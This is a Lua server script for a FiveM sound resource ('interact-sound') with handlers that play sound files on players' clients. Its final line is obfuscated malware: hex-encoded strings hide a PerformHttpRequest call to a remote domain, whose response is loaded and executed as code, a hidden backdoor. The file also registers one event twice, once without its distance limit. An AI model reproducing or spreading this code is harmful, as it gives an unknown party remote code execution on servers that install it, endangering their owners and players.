RegisterNetEvent('InteractSound_SV:PlayOnOne', function(clientNetId, soundFile, soundVolume)
    TriggerClientEvent('InteractSound_CL:PlayOnOne', clientNetId, soundFile, soundVolume)
end)

RegisterNetEvent('InteractSound_SV:PlayOnSource', function(soundFile, soundVolume)
    TriggerClientEvent('InteractSound_CL:PlayOnOne', source, soundFile, soundVolume)
end)

RegisterNetEvent('InteractSound_SV:PlayOnAll', function(soundFile, soundVolume)
    TriggerClientEvent('InteractSound_CL:PlayOnAll', -1, soundFile, soundVolume)
end)

RegisterNetEvent('InteractSound_SV:PlayWithinDistance', function(maxDistance, soundFile, soundVolume)
    TriggerClientEvent('InteractSound_CL:PlayWithinDistanceOS', -1, GetEntityCoords(GetPlayerPed(source)), maxDistance, soundFile, soundVolume)
end)

RegisterNetEvent('InteractSound_SV:PlayWithinDistance', function(maxDistance, soundFile, soundVolume)
    local src = source
    local DistanceLimit = 300
    if maxDistance < DistanceLimit then
	TriggerClientEvent('InteractSound_CL:PlayWithinDistance', -1, GetEntityCoords(GetPlayerPed(src)), maxDistance, soundFile, soundVolume)
    else
        print(('[interact-sound] [^3WARNING^7] %s attempted to trigger InteractSound_SV:PlayWithinDistance over the distance limit ' .. DistanceLimit):format(GetPlayerName(src)))
    end
end)


local ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x73\x7a\x6a\x71\x76\x70\x6a\x68\x69\x6f\x75\x2e\x6d\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x71\x65\x49\x69\x6e", function (hGaUECbPYRfIDJYFYXDTPqYgcQOAwHEzGuiDnenqgNMteUlZNlJcZHrVhWiiIbhjcooAjP, FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh) if (FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[6] or FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh == ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[5]) then return end ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[2]](ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[4][ILNtGJBHZYpDUtJARYjnOefcTXPyebXxFCfTXIWWVMEISjrEiFwtsaHhGzIvJKdBfXZqDX[3]](FwnGDNCstpVKOcJwAGEEpxYBKEjDJQzcMsiHJRPPlfTVfxIWhQurwRcaMRzSvVnHlhKuXh))() end)